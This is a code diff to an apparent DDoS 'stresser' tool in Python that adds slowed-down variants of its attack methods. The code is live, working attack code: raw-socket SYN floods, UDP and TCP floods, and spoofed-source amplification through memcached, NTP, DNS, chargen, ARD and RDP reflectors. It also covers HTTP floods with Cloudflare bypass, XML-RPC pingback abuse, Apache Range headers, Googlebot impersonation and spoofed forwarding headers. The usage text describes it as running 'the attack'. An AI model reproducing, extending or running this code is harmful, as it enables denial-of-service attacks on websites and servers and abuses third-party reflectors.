@@ -40,10 +40,16 @@ class Methods:
     LAYER7_METHODS: Set[str] = {"CFB", "BYPASS", "GET", "POST", "OVH", "STRESS",
                                 "DYN", "SLOW", "HEAD", "NULL", "COOKIE", "PPS",
                                 "EVEN", "GSB", "DGB", "AVB", "CFBUAM", "APACHE",
-                                "XMLRPC", "BOT"}
+                                "XMLRPC", "BOT",
+                                "SLOWCFB", "SLOWGET", "SLOWPOST", "SLOWOVH", "SLOWSTRESS",
+                                "SLOWDYN", "SLOWNULL", "SLOWCOOKIE", "SLOWPPS",
+                                "SLOWEVEN", "SLOWGSB", "DGB", "SLOWAPACHE",
+                                "SLOWXMLRPC", "SLOWBOT"}
 
     LAYER4_METHODS: Set[str] = {"TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM",
-                                "NTP", "DNS", "ARD", "CHAR", "RDP"}
+                                "NTP", "DNS", "ARD", "CHAR", "RDP",
+                                "SLOWTCP", "SLOWUDP", "SLOWSYN", "SLOWVSE", "SLOWMEM",
+                                "SLOWNTP", "SLOWDNS", "SLOWARD", "SLOWCHAR", "SLOWRDP"}
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
 
@@ -114,34 +120,63 @@ class Layer4:
 
     def select(self, name):
         self.SENT_FLOOD = self.TCP
+        if name == "SLOWTCP": self.SENT_FLOOD = self.SLOWTCP
         if name == "UDP": self.SENT_FLOOD = self.UDP
+        if name == "SLOWUDP": self.SENT_FLOOD = self.SLOWUDP
         if name == "SYN": self.SENT_FLOOD = self.SYN
+        if name == "SLOWSYN": self.SENT_FLOOD = self.SLOWSYN
         if name == "VSE": self.SENT_FLOOD = self.VSE
+        if name == "SLOWVSE": self.SENT_FLOOD = self.SLOWVSE
         if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
         if name == "RDP":
             self._amp_payload = (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
+        if name == "SLOWRDP":
+            self._amp_payload = (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389)
+            self.SENT_FLOOD = self.SLOWAMP
+            self._amp_payloads = cycle(self._generate_amp())
         if name == "MEM":
             self._amp_payload = (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
             self.SENT_FLOOD = self.AMP
+            self._amp_payloads = cycle(self._generate_amp())
+        if name == "SLOWMEM":
+            self._amp_payload = (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
+            self.SENT_FLOOD = self.SLOWAMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "CHAR":
             self._amp_payload = (b'\x01', 19)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
+        if name == "SLOWCHAR":
+            self._amp_payload = (b'\x01', 19)
+            self.SENT_FLOOD = self.SLOWAMP
+            self._amp_payloads = cycle(self._generate_amp())
         if name == "ARD":
             self._amp_payload = (b'\x00\x14\x00\x00', 3283)
             self.SENT_FLOOD = self.AMP
+            self._amp_payloads = cycle(self._generate_amp())
+        if name == "SLOWARD":
+            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
+            self.SENT_FLOOD = self.SLOWAMP
             self._amp_payloads = cycle(self._generate_amp())
         if name == "NTP":
             self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
             self.SENT_FLOOD = self.AMP
             self._amp_payloads = cycle(self._generate_amp())
+        if name == "SLOWNTP":
+            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
+            self.SENT_FLOOD = self.SLOWAMP
+            self._amp_payloads = cycle(self._generate_amp())
         if name == "DNS":
             self._amp_payload = (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                                  b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
             self.SENT_FLOOD = self.AMP
+            self._amp_payloads = cycle(self._generate_amp())
+        if name == "SLOWDNS":
+            self._amp_payload = (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
+                                 b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
+            self.SENT_FLOOD = self.SLOWAMP
             self._amp_payloads = cycle(self._generate_amp())
 
     def TCP(self) -> None:
@@ -159,112 +194,174 @@ class Layer4:
             requests_sent = requests_sent - 1
             requests_failed = requests_failed + 1
 
+    def SLOWTCP(self) -> None:
+        global requests_sent
+        global requests_failed
 
-def MINECRAFT(self) -> None:
-    global requests_sent
-    global requests_failed
+        try:
+            with socket(AF_INET, SOCK_STREAM) as s:
+                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+                s.connect(self._target)
+                while s.send(randbytes(1024)):
+                    sleep(240.0)
+        except Exception:
+            s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
 
-    try:
-        with socket(AF_INET, SOCK_STREAM) as s:
-            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-            s.connect(self._target)
-            s.send(b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA')
-            while s.send(b'\x01'):
-                s.send(b'\x00')
-    except Exception:
-        s.close()
-        requests_sent = requests_sent - 1
-        requests_failed = requests_failed + 1
+    def MINECRAFT(self) -> None:
+        global requests_sent
+        global requests_failed
 
+        try:
+            with socket(AF_INET, SOCK_STREAM) as s:
+                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+                s.connect(self._target)
+                s.send(b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA')
+                while s.send(b'\x01'):
+                    s.send(b'\x00')
+        except Exception:
+            s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
 
-def UDP(self) -> None:
-    global requests_sent
-    global requests_failed
+    def UDP(self) -> None:
+        global requests_sent
+        global requests_failed
 
-    try:
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while s.sendto(randbytes(1024), self._target):
-                continue
-    except Exception:
-        s.close()
-        requests_sent = requests_sent - 1
-        requests_failed = requests_failed + 1
+        try:
+            with socket(AF_INET, SOCK_DGRAM) as s:
+                while s.sendto(randbytes(1024), self._target):
+                    continue
+        except Exception:
+            s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
 
+    def SLOWUDP(self) -> None:
+        global requests_sent
+        global requests_failed
 
-def SYN(self) -> None:
-    global requests_sent
-    global requests_failed
+        try:
+            with socket(AF_INET, SOCK_DGRAM) as s:
+                while s.sendto(randbytes(1024), self._target):
+                    sleep(240.0)
+        except Exception:
+            s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
 
-    try:
-        with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+    def SYN(self) -> None:
+        global requests_sent
+        global requests_failed
 
-            while s.sendto(self._genrate_syn(), self._target):
-                continue
-    except Exception:
-        s.close()
-        requests_sent = requests_sent - 1
-        requests_failed = requests_failed + 1
+        try:
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                while s.sendto(self._genrate_syn(), self._target):
+                    continue
+        except Exception:
+            s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
 
+    def SLOWSYN(self) -> None:
+        global requests_sent
+        global requests_failed
 
-def AMP(self) -> None:
-    global requests_sent
-    global requests_failed
+        try:
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                while s.sendto(self._genrate_syn(), self._target):
+                    sleep(70.0)
+        except Exception:
+            s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
 
-    try:
-        with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while s.sendto(*next(self._amp_payloads)):
-                continue
-    except Exception:
-        s.close()
-        requests_sent = requests_sent - 1
-        requests_failed = requests_failed + 1
+    def AMP(self) -> None:
+        global requests_sent
+        global requests_failed
 
+        try:
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                while s.sendto(*next(self._amp_payloads)):
+                    continue
+        except Exception:
+            s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
 
-def VSE(self) -> None:
-    global requests_sent
-    global requests_failed
+    def SLOWAMP(self) -> None:
+        global requests_sent
+        global requests_failed
 
-    try:
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
-                            b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
-                continue
-    except Exception:
-        s.close()
-        requests_sent = requests_sent - 1
-        requests_failed = requests_failed + 1
+        try:
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                while s.sendto(*next(self._amp_payloads)):
+                    sleep(240.0)
+        except Exception:
+            s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
 
+    def VSE(self) -> None:
+        global requests_sent
+        global requests_failed
 
-def _genrate_syn(self) -> bytes:
-    ip: IP = IP()
-    ip.set_ip_src(localIP)
-    ip.set_ip_dst(self._target[0])
-    tcp: TCP = TCP()
-    tcp.set_SYN()
-    tcp.set_th_dport(self._target[1])
-    tcp.set_th_sport(randint(1, 65535))
-    ip.contains(tcp)
-    return ip.get_packet()
+        try:
+            with socket(AF_INET, SOCK_DGRAM) as s:
+                while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
+                                b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
+                    continue
+        except Exception:
+            s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
 
+    def SLOWVSE(self) -> None:
+        global requests_sent
+        global requests_failed
 
-def _generate_amp(self):
-    payloads = []
-    for ref in self._ref:
+        try:
+            with socket(AF_INET, SOCK_DGRAM) as s:
+                while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
+                                b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
+                    sleep(40.0)
+        except Exception:
+            s.close()
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
+    def _genrate_syn(self) -> bytes:
         ip: IP = IP()
-        ip.set_ip_src(self._target[0])
-        ip.set_ip_dst(ref)
+        ip.set_ip_src(localIP)
+        ip.set_ip_dst(self._target[0])
+        tcp: TCP = TCP()
+        tcp.set_SYN()
+        tcp.set_th_dport(self._target[1])
+        tcp.set_th_sport(randint(1, 65535))
+        ip.contains(tcp)
+        return ip.get_packet()
 
-        ud: UDP = UDP()
-        ud.set_uh_dport(self._amp_payload[1])
-        ud.set_uh_sport(self._target[1])
+    def _generate_amp(self):
+        payloads = []
+        for ref in self._ref:
+            ip: IP = IP()
+            ip.set_ip_src(self._target[0])
+            ip.set_ip_dst(ref)
 
-        ud.contains(Data(self._amp_payload[0]))
-        ip.contains(ud)
+            ud: UDP = UDP()
+            ud.set_uh_dport(self._amp_payload[1])
+            ud.set_uh_sport(self._target[1])
 
-        payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
-    return payloads
+            ud.contains(Data(self._amp_payload[0]))
+            ip.contains(ud)
+
+            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
+        return payloads
 
 
 # noinspection PyBroadException
@@ -385,11 +482,12 @@ class HttpFlood:
 
     @staticmethod
     def getMethodType(method: str) -> str:
-        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
-                                            "STRESS", "DYN", "SLOW", "PPS", "APACHE"
-                                                                            "BOT"} \
-            else "POST" if {method.upper()} & {"POST", "XMLRPC"} \
-            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
+        return "GET" if {method.upper()} & {"CFB", "SLOWCFB", "CFBUAM", "GET", "SLOWGET", "COOKIE", "SLOWCOOKIE",
+                                            "OVH", "SLOWOVH", "EVEN", "SLOWEVEN", "STRESS", "SLOWSTRESS",
+                                            "DYN", "SLOWDYN", "SLOW", "PPS", "SLOWPPS", "APACHE", "SLOWAPACHE",
+                                            "BOT", "SLOWBOT"} \
+            else "POST" if {method.upper()} & {"POST", "XMLRPC", "SLOWPOST", "SLOWXMLRPC"} \
+            else "HEAD" if {method.upper()} & {"GSB", "HEAD", "SLOWGSB", "SLOWHEAD"} \
             else "REQUESTS"
 
     def POST(self) -> None:
@@ -409,6 +507,24 @@ class HttpFlood:
             requests_sent = requests_sent - 1
             requests_failed = requests_failed + 1
 
+    def SLOWPOST(self) -> None:
+        payload: bytes = self.generate_payload(("Content-Length: 44\r\n"
+                                                "X-Requested-With: XMLHttpRequest\r\n"
+                                                "Content-Type: application/json\r\n\r\n"
+                                                '{"data": %s}'
+                                                ) % ProxyTools.Random.rand_str(32))[:-2]
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+                    sleep(55.0)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
     def STRESS(self) -> None:
         payload: bytes = self.generate_payload((f"Content-Length: 524\r\n"
                                                 "X-Requested-With: XMLHttpRequest\r\n"
@@ -419,6 +535,24 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
+    def SLOWSTRESS(self) -> None:
+        payload: bytes = self.generate_payload((f"Content-Length: 524\r\n"
+                                                "X-Requested-With: XMLHttpRequest\r\n"
+                                                "Content-Type: application/json\r\n\r\n"
+                                                '{"data": %s}'
+                                                ) % ProxyTools.Random.rand_str(512))[:-2]
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+                    sleep(55.0)
         except Exception:
             s.close()
             global requests_sent
@@ -444,12 +578,45 @@ class HttpFlood:
             requests_sent = requests_sent - 1
             requests_failed = requests_failed + 1
 
+    def SLOWCOOKIES(self) -> None:
+        payload: bytes = self.generate_payload("Cookie: _ga=GA%s;"
+                                               " _gat=1;"
+                                               " __cfduid=dc232334gwdsd23434542342342342475611928;"
+                                               " %s=%s\r\n" % (randint(1000, 99999),
+                                                               ProxyTools.Random.rand_str(6),
+                                                               ProxyTools.Random.rand_str(32)))
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+                    sleep(55.0)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
     def APACHE(self) -> None:
         payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
+    def SLOWAPACHE(self) -> None:
+        payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+                    sleep(55.0)
         except Exception:
             s.close()
             global requests_sent
@@ -479,11 +646,47 @@ class HttpFlood:
             requests_sent = requests_sent - 1
             requests_failed = requests_failed + 1
 
+    def SLOWXMLRPC(self) -> None:
+        payload: bytes = self.generate_payload(("Content-Length: 345\r\n"
+                                                "X-Requested-With: XMLHttpRequest\r\n"
+                                                "Content-Type: application/xml\r\n\r\n"
+                                                "<?xml version='1.0' encoding='iso-8859-1'?>"
+                                                "<methodCall><methodName>pingback.ping</methodName>"
+                                                "<params><param><value><string>%s</string></value>"
+                                                "</param><param><value><string>%s</string>"
+                                                "</value></param></params></methodCall>"
+                                                ) % (ProxyTools.Random.rand_str(64),
+                                                     ProxyTools.Random.rand_str(64)))[:-2]
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+                    sleep(55.0)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
     def PPS(self) -> None:
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(self._defaultpayload)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
+    def SLOWPPS(self) -> None:
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(self._defaultpayload)
+                    sleep(55.0)
         except Exception:
             s.close()
             global requests_sent
@@ -497,6 +700,20 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
+    def SLOWGET(self) -> None:
+        payload: bytes = self.generate_payload()
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+                    sleep(55.0)
         except Exception:
             s.close()
             global requests_sent
@@ -536,12 +753,58 @@ class HttpFlood:
             requests_sent = requests_sent - 1
             requests_failed = requests_failed + 1
 
+    def SLOWBOT(self) -> None:
+        payload: bytes = self.generate_payload()
+        try:
+            with self.open_connection() as s:
+                s.send(str.encode(
+                    "GET /robots.txt HTTP/1.1\r\n"
+                    "Host: %s\r\n" % self._target.raw_authority +
+                    "Connection: Keep-Alive\r\n"
+                    "Accept: text/plain,text/html,*/*\r\n"
+                    "User-Agent: %s\r\n" % randchoice(google_agents) +
+                    "Accept-Encoding: gzip,deflate,br\r\n\r\n"
+                ))
+                s.send(str.encode(
+                    "GET /sitemap.xml HTTP/1.1\r\n"
+                    "Host: %s\r\n" % self._target.raw_authority +
+                    "Connection: Keep-Alive\r\n"
+                    "Accept: */*\r\n"
+                    "From: googlebot(at)googlebot.com\r\n"
+                    "User-Agent: %s\r\n" % randchoice(google_agents) +
+                    "Accept-Encoding: gzip,deflate,br\r\n"
+                    "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9), ProxyTools.Random.rand_str(4)) +
+                    "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
+                ))
+                for _ in range(self._rpc):
+                    s.send(payload)
+                    sleep(55.0)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
     def EVEN(self) -> None:
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 while s.send(payload) and s.recv(1):
                     continue
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
+    def SLOWEVEN(self) -> None:
+        payload: bytes = self.generate_payload()
+        try:
+            with self.open_connection() as s:
+                while s.send(payload) and s.recv(1):
+                    sleep(55.0)
         except Exception:
             s.close()
             global requests_sent
@@ -562,6 +825,20 @@ class HttpFlood:
             requests_sent = requests_sent - 1
             requests_failed = requests_failed + 1
 
+    def SLOWOVH(self) -> None:
+        payload: bytes = self.generate_payload()
+        try:
+            with self.open_connection() as s:
+                for _ in range(min(self._rpc, 5)):
+                    s.send(payload)
+                    sleep(55.0)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
     def CFB(self):
         pro = None
         if self._proxies:
@@ -573,6 +850,25 @@ class HttpFlood:
                         s.get(self._target.human_repr(), proxies=pro.asRequest())
                         continue
                     s.get(self._target.human_repr())
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
+    def SLOWCFB(self):
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+        try:
+            with create_scraper() as s:
+                for _ in range(self._rpc):
+                    if pro:
+                        s.get(self._target.human_repr(), proxies=pro.asRequest())
+                        continue
+                    s.get(self._target.human_repr())
+                    sleep(55.0)
         except Exception:
             s.close()
             global requests_sent
@@ -642,6 +938,24 @@ class HttpFlood:
             requests_sent = requests_sent - 1
             requests_failed = requests_failed + 1
 
+    def SLOWDYN(self):
+        payload: str | bytes = self._payload
+        payload += "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority)
+        payload += self.randHeadercontent
+        payload += self.SpoofIP
+        payload = str.encode(f"{payload}\r\n")
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+                    sleep(55.0)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
     def GSB(self):
         payload = "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type, self._target.raw_path_qs, ProxyTools.Random.rand_str(6))
         payload = (payload +
@@ -671,6 +985,36 @@ class HttpFlood:
             requests_sent = requests_sent - 1
             requests_failed = requests_failed + 1
 
+    def SLOWGSB(self):
+        payload = "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type, self._target.raw_path_qs, ProxyTools.Random.rand_str(6))
+        payload = (payload +
+                   'Accept-Encoding: gzip, deflate, br\r\n'
+                   'Accept-Language: en-US,en;q=0.9\r\n'
+                   'Cache-Control: max-age=0\r\n'
+                   'Connection: Keep-Alive\r\n'
+                   'Sec-Fetch-Dest: document\r\n'
+                   'Sec-Fetch-Mode: navigate\r\n'
+                   'Sec-Fetch-Site: none\r\n'
+                   'Sec-Fetch-User: ?1\r\n'
+                   'Sec-Gpc: 1\r\n'
+                   'Pragma: no-cache\r\n'
+                   'Upgrade-Insecure-Requests: 1\r\n')
+        payload += "Host: %s\r\n" % self._target.authority
+        payload += self.randHeadercontent
+        payload += self.SpoofIP
+        payload = str.encode(f"{payload}\r\n")
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+                    sleep(55.0)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
     def NULL(self) -> None:
         payload: str | bytes = self._payload
         payload += "Host: %s\r\n" % self._target.authority
@@ -682,6 +1026,25 @@ class HttpFlood:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     s.send(payload)
+        except Exception:
+            s.close()
+            global requests_sent
+            global requests_failed
+            requests_sent = requests_sent - 1
+            requests_failed = requests_failed + 1
+
+    def SLOWNULL(self) -> None:
+        payload: str | bytes = self._payload
+        payload += "Host: %s\r\n" % self._target.authority
+        payload += "User-Agent: null\r\n"
+        payload += "Referrer: null\r\n"
+        payload += self.SpoofIP
+        payload = str.encode(f"{payload}\r\n")
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+                    sleep(55.0)
         except Exception:
             s.close()
             global requests_sent
@@ -709,25 +1072,41 @@ class HttpFlood:
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
+        if name == "SLOWGET": self.SENT_FLOOD = self.SLOWGET
         if name == "POST": self.SENT_FLOOD = self.POST
+        if name == "SLOWPOST": self.SENT_FLOOD = self.SLOWPOST
         if name == "CFB": self.SENT_FLOOD = self.CFB
+        if name == "SLOWCFB": self.SENT_FLOOD = self.SLOWCFB
         if name == "CFBUAM": self.SENT_FLOOD = self.CFBUAM
         if name == "XMLRPC": self.SENT_FLOOD = self.XMLRPC
+        if name == "SLOWXMLRPC": self.SENT_FLOOD = self.SLOWXMLRPC
         if name == "BOT": self.SENT_FLOOD = self.BOT
+        if name == "SLOWBOT": self.SENT_FLOOD = self.SLOWBOT
         if name == "APACHE": self.SENT_FLOOD = self.APACHE
+        if name == "SLOWAPACHE": self.SENT_FLOOD = self.SLOWAPACHE
         if name == "BYPASS": self.SENT_FLOOD = self.BYPASS
         if name == "OVH": self.SENT_FLOOD = self.OVH
+        if name == "SLOWOVH": self.SENT_FLOOD = self.SLOWOVH
         if name == "AVB": self.SENT_FLOOD = self.AVB
         if name == "STRESS": self.SENT_FLOOD = self.STRESS
+        if name == "SLOWSTRESS": self.SENT_FLOOD = self.SLOWSTRESS
         if name == "DYN": self.SENT_FLOOD = self.DYN
+        if name == "SLOWDYN": self.SENT_FLOOD = self.SLOWDYN
         if name == "SLOW": self.SENT_FLOOD = self.SLOW
         if name == "GSB": self.SENT_FLOOD = self.GSB
+        if name == "SLOWGSB": self.SENT_FLOOD = self.SLOWGSB
         if name == "NULL": self.SENT_FLOOD = self.NULL
+        if name == "SLOWNULL": self.SENT_FLOOD = self.SLOWNULL
         if name == "COOKIE": self.SENT_FLOOD = self.COOKIES
+        if name == "SLOWCOOKIE": self.SENT_FLOOD = self.SLOWCOOKIES
         if name == "PPS":
             self.SENT_FLOOD = self.PPS
             self._defaultpayload = (self._defaultpayload + "Host: %s\r\n\r\n" % self._target.authority).encode()
+        if name == "SLOWPPS":
+            self.SENT_FLOOD = self.SLOWPPS
+            self._defaultpayload = (self._defaultpayload + "Host: %s\r\n\r\n" % self._target.authority).encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
+        if name == "SLOWEVEN": self.SENT_FLOOD = self.SLOWEVEN
 
     def BYPASS(self):
         pro = None
@@ -843,7 +1222,7 @@ class ToolsConsole:
                                                  str(cpu_percent()) + "%",
                                                  str(virtual_memory().percent) + "%"))
             if cmd in ["CFIP", "DNS"]:
-                print("Soon")
+                print("Now unavailable!")
                 continue
 
             if cmd == "CHECK":
@@ -947,7 +1326,7 @@ class ToolsConsole:
 
     @staticmethod
     def usage():
-        print(('* Coded By MH_ProDev For Better Stresser\n'
+        print(('/|\\ Coded By MH_ProDev For Better Stresser (modified by imperzer0)\n'
                'Note: If the Proxy list is empty, the attack will run without proxies\n'
                '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                '      Proxy Type 0 = All in config.json\n'
